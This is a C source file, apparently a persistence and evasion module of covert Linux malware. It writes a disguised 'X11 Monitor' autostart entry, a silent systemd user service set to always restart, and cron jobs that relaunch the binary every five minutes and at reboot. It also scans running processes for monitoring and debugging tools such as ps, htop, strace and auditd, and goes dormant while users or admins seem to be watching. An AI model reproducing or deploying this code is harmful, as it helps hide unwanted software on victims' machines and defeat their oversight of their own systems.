#include "persistence.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <ctype.h>

// Estado global de persistencia
PersistenceState g_persist_state = {
    .state = STATE_NORMAL,
    .state_changed_at = 0,
    .last_threat_check = 0,
    .consecutive_safe_checks = 0,
    .sleep_threshold = 12  // 12 checks * 5s = ~60s para despertar
};

/**
 * Obtiene el directorio home del usuario actual
 */
static const char* get_home_dir(void) {
    static char home[512] = {0};
    
    if (home[0] != '\0') {
        return home;
    }
    
    const char *home_env = getenv("HOME");
    if (home_env) {
        strncpy(home, home_env, sizeof(home) - 1);
        home[sizeof(home) - 1] = '\0';
        return home;
    }
    
    struct passwd *pw = getpwuid(getuid());
    if (pw && pw->pw_dir) {
        strncpy(home, pw->pw_dir, sizeof(home) - 1);
        home[sizeof(home) - 1] = '\0';
        return home;
    }
    
    return NULL;
}

/**
 * Crea directorios recursivamente si no existen
 */
static int mkdir_recursive(const char *path, mode_t mode) {
    char tmp[512];
    char *p = NULL;
    size_t len;
    
    if (path == NULL) return -1;
    
    snprintf(tmp, sizeof(tmp), "%s", path);
    len = strlen(tmp);
    
    if (tmp[len - 1] == '/') {
        tmp[len - 1] = 0;
    }
    
    for (p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = 0;
            mkdir(tmp, mode);
            *p = '/';
        }
    }
    
    return mkdir(tmp, mode);
}

// ========== INSTALACIÓN: Desktop Entry ==========

int install_autostart_entry(const char *binary_path) {
    if (!binary_path || binary_path[0] == '\0') {
        return -1;
    }
    
    const char *home = get_home_dir();
    if (!home) {
        return -1;
    }
    
    char autostart_dir[512];
    snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", home);
    mkdir_recursive(autostart_dir, 0700);
    
    char desktop_file[512];
    snprintf(desktop_file, sizeof(desktop_file), "%s/x11-monitor.desktop", autostart_dir);
    
    FILE *f = fopen(desktop_file, "w");
    if (!f) {
        return -1;
    }
    
    fprintf(f, "[Desktop Entry]\n");
    fprintf(f, "Version=1.0\n");
    fprintf(f, "Type=Application\n");
    fprintf(f, "Name=X11 Monitor\n");
    fprintf(f, "Comment=System Monitor Service\n");
    fprintf(f, "Exec=%s --daemon --quiet\n", binary_path);
    fprintf(f, "Path=%s\n", binary_path);  // Agregar ruta de trabajo
    fprintf(f, "Hidden=false\n");
    fprintf(f, "NoDisplay=false\n");
    fprintf(f, "StartupNotify=false\n");
    fprintf(f, "Terminal=false\n");
    fprintf(f, "Categories=System;Utility;\n");
    fprintf(f, "X-GNOME-Autostart-enabled=true\n");  // Para GNOME
    fprintf(f, "X-KDE-autostart-after=panel\n");     // Para KDE
    fprintf(f, "X-XFCE-Autostart=true\n");           // Para XFCE
    
    fclose(f);
    chmod(desktop_file, 0644);  // Permisos legibles
    
    // IMPORTANTE: Asegurar que el binario tiene permisos de ejecución
    chmod(binary_path, 0755);
    
    return 0;
}

// ========== INSTALACIÓN: Systemd Service ==========

int install_systemd_service(const char *binary_path) {
    if (!binary_path || binary_path[0] == '\0') {
        return -1;
    }
    
    const char *home = get_home_dir();
    if (!home) {
        return -1;
    }
    
    char service_dir[512];
    snprintf(service_dir, sizeof(service_dir), "%s/.config/systemd/user", home);
    mkdir_recursive(service_dir, 0700);
    
    char service_file[512];
    snprintf(service_file, sizeof(service_file), "%s/x11-monitor.service", service_dir);
    
    FILE *f = fopen(service_file, "w");
    if (!f) {
        return -1;
    }
    
    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=X11 System Monitor\n");
    fprintf(f, "Documentation=man:x11-monitor(1)\n");
    fprintf(f, "# Ejecutar después de graphical-session si existe, pero sin depender de él\n");
    fprintf(f, "After=graphical-session.target\n");
    fprintf(f, "Wants=graphical-session.target\n\n");
    
    fprintf(f, "[Service]\n");
    fprintf(f, "Type=simple\n");
    fprintf(f, "ExecStart=%s --daemon --quiet\n", binary_path);
    fprintf(f, "# Reintentar cada 180 segundos (3 minutos) si se detiene\n");
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=180\n");
    fprintf(f, "# Redirigir output a null (sin logs)\n");
    fprintf(f, "StandardOutput=null\n");
    fprintf(f, "StandardError=null\n");
    fprintf(f, "# Aislamiento básico\n");
    fprintf(f, "PrivateTmp=yes\n");
    fprintf(f, "NoNewPrivileges=yes\n");
    fprintf(f, "# Environment para X11\n");
    fprintf(f, "Environment=\"PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\n\n");
    
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=graphical-session.target\n");
    fprintf(f, "# Fallback: también ejecutar en default.target si graphical no existe\n");
    fprintf(f, "Also=default.target\n");
    
    fclose(f);
    chmod(service_file, 0644);
    
    // Activar servicio
    int ret1 = system("systemctl --user daemon-reload 2>/dev/null");
    int ret2 = system("systemctl --user enable x11-monitor.service 2>/dev/null");
    
    // Retornar éxito si ambos comandos se ejecutaron sin error fatal
    return (ret1 == 0 || ret2 == 0) ? 0 : -1;
}

// ========== INSTALACIÓN: Cron Job ==========

int install_cron_job(const char *binary_path) {
    if (!binary_path || binary_path[0] == '\0') {
        return -1;
    }
    
    char cron_cmd[512];
    snprintf(cron_cmd, sizeof(cron_cmd),
             "*/5 * * * * pgrep -f '%s' >/dev/null || %s 2>/dev/null",
             binary_path, binary_path);

    /* Añadir también una entrada @reboot para iniciar el binario tras reinicio */
    char reboot_cmd[512];
    snprintf(reboot_cmd, sizeof(reboot_cmd),
             "@reboot pgrep -f '%s' >/dev/null || %s 2>/dev/null",
             binary_path, binary_path);

    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null | grep -v '%s'; echo '%s'; echo '%s') | crontab -",
             binary_path, cron_cmd, reboot_cmd);

    int ret = system(cmd);
    return (ret == 0) ? 0 : -1;
}

// ========== DETECCIÓN: Terminales Activas ==========

int detect_active_terminals(void) {
    DIR *dir;
    struct dirent *entry;
    
    // Buscar en /dev/pts/ (pseudo-terminales)
    dir = opendir("/dev/pts");
    if (dir) {
        int count = 0;
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                count++;
            }
        }
        closedir(dir);
        
        if (count > 0) {
            return 1;  // Hay terminales abiertas
        }
    }
    
    return 0;
}

// ========== DETECCIÓN: Herramientas de Auditoría ==========

int detect_auditing_tools(void) {
    DIR *proc_dir;
    struct dirent *entry;
    char cmdline_path[256];
    char cmd[256];
    FILE *f;
    
    // Herramientas sospechosas
    const char *suspicious[] = {
        "ps", "top", "htop", "atop",
        "lsof", "netstat", "ss",
        "strace", "ltrace", "gdb",
        "systemctl", "journalctl",
        "auditctl", "auditd",
        NULL
    };
    
    proc_dir = opendir("/proc");
    if (!proc_dir) {
        return 0;
    }
    
    while ((entry = readdir(proc_dir)) != NULL) {
        // Solo directorios numéricos (PIDs)
        if (entry->d_type != DT_DIR || !isdigit(entry->d_name[0])) {
            continue;
        }
        
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", entry->d_name);
        f = fopen(cmdline_path, "r");
        if (!f) {
            continue;
        }
        
        if (fgets(cmd, sizeof(cmd), f)) {
            // Extraer nombre del ejecutable
            char *basename = strrchr(cmd, '/');
            if (basename) {
                basename++;
            } else {
                basename = cmd;
            }
            
            // Buscar en lista sospechosa
            for (int i = 0; suspicious[i]; i++) {
                if (strncmp(basename, suspicious[i], strlen(suspicious[i])) == 0) {
                    fclose(f);
                    closedir(proc_dir);
                    return 1;
                }
            }
        }
        
        fclose(f);
    }
    
    closedir(proc_dir);
    return 0;
}

// ========== EVALUACIÓN INTEGRAL ==========

int is_user_suspicious(void) {
    // Chequeo 1: Terminales abiertas (muy ligero)
    if (detect_active_terminals()) {
        return 1;
    }
    
    // Chequeo 2: Herramientas de auditoría (más costoso)
    if (detect_auditing_tools()) {
        return 1;
    }
    
    return 0;  // No hay amenaza detectada
}

// ========== GESTIÓN DE ESTADO ==========

OperationState get_current_state(void) {
    return g_persist_state.state;
}

void set_operation_state(OperationState state) {
    if (g_persist_state.state != state) {
        g_persist_state.state = state;
        g_persist_state.state_changed_at = time(NULL);
        
        if (state == STATE_NORMAL) {
            g_persist_state.consecutive_safe_checks = 0;
        }
    }
}

void update_persistence_state(void) {
    time_t now = time(NULL);
    
    // Limitar frecuencia de chequeos (máximo cada 5 segundos)
    if ((now - g_persist_state.last_threat_check) < 5) {
        return;
    }
    
    g_persist_state.last_threat_check = now;
    
    switch (g_persist_state.state) {
        case STATE_NORMAL:
            // Verificar si hay amenaza
            if (is_user_suspicious()) {
                set_operation_state(STATE_SLEEP);
            }
            break;
            
        case STATE_SLEEP:
            // Verificar si es seguro despertar
            if (!is_user_suspicious()) {
                g_persist_state.consecutive_safe_checks++;
                
                // Solo despertar después de N chequeos seguidos seguros
                if (g_persist_state.consecutive_safe_checks >= g_persist_state.sleep_threshold) {
                    set_operation_state(STATE_NORMAL);
                    g_persist_state.consecutive_safe_checks = 0;
                }
            } else {
                // Reset contador si detecta amenaza nuevamente
                g_persist_state.consecutive_safe_checks = 0;
            }
            break;
            
        case STATE_SUSPENDED:
            // Estado manual, requiere intervención
            break;
    }
}

const char* state_to_string(OperationState state) {
    switch (state) {
        case STATE_NORMAL:
            return "NORMAL";
        case STATE_SLEEP:
            return "SLEEP";
        case STATE_SUSPENDED:
            return "SUSPENDED";
        default:
            return "UNKNOWN";
    }
}
